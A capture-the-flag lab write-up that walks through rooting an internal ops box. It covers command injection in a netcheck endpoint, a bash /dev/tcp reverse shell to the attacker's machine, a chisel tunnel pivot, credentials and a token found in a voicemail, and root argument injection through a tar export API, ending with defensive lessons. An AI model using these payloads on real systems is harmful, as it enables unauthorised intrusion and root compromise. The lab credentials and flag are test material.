# Day 11 — Infinity Pool

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed (2026-08-07)
- **Target:** `http://10.146.144.164/` — the Byte Lotus internal ops box. A public web app exposes an `/internal/netcheck` diagnostics endpoint; behind it (localhost-only) sit a **FreePBX UCP** portal (`:8080`), an **automation/export API** (`:9000`), and a dev service (`:3000`).
- **Category:** Boot2Root — command injection → reverse shell → chisel pivot → FreePBX UCP creds → authenticated root RCE (argument injection)
- **Objective:** Chain the low-priv web foothold into internal services and read `/root/root.txt`.
- **Vulnerability:** **OS command injection** in `/internal/netcheck` (the `host` param is concatenated straight into a shell command), plus a second **command/argument-injection** in the internal export API (`report` value dropped into a `tar czf .../<report>.tgz ...` command line) that runs **as root** once you hold the automation bearer token — a token left sitting in a FreePBX UCP **voicemail**.
- **Attack path (summary):**
  1. **Command injection foothold:** `POST /internal/netcheck` with `host=127.0.0.1; id` executes as the web user → `uid=1001(web)`. Confirms the `host` parameter is passed unsanitised into a shell.
  2. **Reverse shell:** start a `nc -lvnp 4444` listener on Kali, then inject a backgrounded `bash -i >& /dev/tcp/KALI/4444` payload (wrapped in `setsid ... </dev/null >/dev/null 2>&1 &` so the HTTP request returns cleanly). Stabilise with `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `export TERM=xterm`.
  3. **Pivot with chisel:** the interesting services (`8080`, `9000`, `3000`) only listen on `127.0.0.1`. Run `chisel server -p 9999 --reverse` on Kali, serve the binary over `python3 -m http.server 8000`, pull it onto the target, and open a reverse tunnel: `./chisel client KALI:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000 R:3000:127.0.0.1:3000`.
  4. **FreePBX UCP → the automation key:** browse `http://127.0.0.1:8080/ucp`, log in as `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026`, and open the voicemail entry titled **"Automation Key"** (CID `<9000>`). It hands out the export API's bearer token: `cc_auto_7b3f9a1c4e0d2f6a`.
  5. **Root RCE via argument injection:** the export API (`POST :9000/jobs/export`, `Authorization: Bearer cc_auto_...`) builds `tar czf /var/automation/exports/<report>.tgz /var/automation/data` and runs it **as root**. The `report` value is injected into that command line. A naive `x || id` half-works (shell sees `... /var/automation/exports/x || id.tgz ...`) but breaks on the appended `.tgz`. The clean payload uses `;` to end the `tar` args and `#` to comment out the forced suffix:
     - `{"report":"x;cat /root/root.txt;#"}` → `tar czf /var/automation/exports/x; cat /root/root.txt; #.tgz ...` → `cat` runs as root, flag returned in the `output` field.
- **Flag:** <details><summary>click to reveal</summary><code>THM{tr4c3d_t0_th3_h0r1z0n}</code></details>
- **Lessons:**
  - **Never build shell commands by string concatenation.** Both bugs — `netcheck`'s `host` and the export API's `report` — come from user input landing on a command line. Use `execve`-style argument arrays (`subprocess.run([...], shell=False)`), not `sh -c "... $userinput ..."`.
  - **Interpolating user data into a *filename argument* is still injection.** The export API "only" put `report` into a `tar` output path, but `;`, `||`, and `#` turned that into arbitrary root command execution. Validate/allow-list such values (`^[A-Za-z0-9_-]+$`) and quote them.
  - **Localhost-only ≠ safe.** The UCP, export API, and dev service bound to `127.0.0.1` felt private, but one command-injection foothold + a chisel reverse tunnel exposed them all. Network isolation is not an authorization control.
  - **Don't stash live credentials in user-facing message stores.** A root-capable bearer token sitting in a **voicemail** meant "get any UCP login" was equivalent to "get the automation key."
  - **Least-privilege the job runner.** The export service ran as **root** to tar up `/var/automation/data`; it never needed root, and running it unprivileged (or via a fixed, non-shell tar invocation) would have contained the argument-injection to a low-value account.

## Walkthrough

```bash
IP=10.146.144.164
KALI=YOUR_KALI_IP

# 1) Confirm command injection -> uid=1001(web)
curl -s -X POST http://$IP/internal/netcheck --data-urlencode 'host=127.0.0.1; id'

# 2) Reverse shell (listener first: nc -lvnp 4444)
curl -s -m 8 -X POST http://$IP/internal/netcheck \
  --data-urlencode "host=127.0.0.1; setsid bash -c \"bash -i >& /dev/tcp/$KALI/4444 0>&1\" </dev/null >/dev/null 2>&1 &"

# 3) Stabilise the shell (on the target)
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm; id

# 4) Chisel pivot for the localhost-only services
#   Kali:   chisel server -p 9999 --reverse
#   Serve:  cp "$(which chisel)" /tmp/chisel && cd /tmp && python3 -m http.server 8000
#   Target:
cd /tmp
curl -s http://$KALI:8000/chisel -o chisel && chmod +x chisel
setsid ./chisel client $KALI:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000 R:3000:127.0.0.1:3000 >/tmp/ch.log 2>&1 &

# 5) FreePBX UCP (in Kali browser): http://127.0.0.1:8080/ucp
#   Login: FreePBXUCPTemplateCreator / St4yN0t1c3d_2026
#   Voicemail "Automation Key" (CID <9000>) -> bearer: cc_auto_7b3f9a1c4e0d2f6a

# 6) Root RCE via argument injection in the export API (runs tar as root)
#   ';' ends the tar args, '#' comments out the appended ".tgz /var/automation/data 2>&1"
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
# ... "output":"THM{tr4c3d_t0_th3_h0r1z0n}\n..."
```

## Key facts

| Item | Value |
| ---- | ----- |
| Target | `http://10.146.144.164/` (internal ops box) |
| Foothold | `POST /internal/netcheck`, `host` param → OS command injection as `uid=1001(web)` |
| Reverse shell | `bash -i >& /dev/tcp/KALI/4444`, backgrounded via `setsid ... &` |
| Pivot | `chisel` reverse tunnel: `R:8080` (UCP), `R:9000` (export API), `R:3000` (dev) |
| UCP creds | `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026` at `:8080/ucp` |
| Bearer token | voicemail "Automation Key" (CID `<9000>`) → `cc_auto_7b3f9a1c4e0d2f6a` |
| Root bug | `POST :9000/jobs/export` builds `tar czf .../<report>.tgz ...` **as root**; `report` injectable |
| Root payload | `{"report":"x;cat /root/root.txt;#"}` (`;` ends args, `#` kills the `.tgz` suffix) |
| Flag location | `/root/root.txt` |
| Flag | `THM{tr4c3d_t0_th3_h0r1z0n}` |
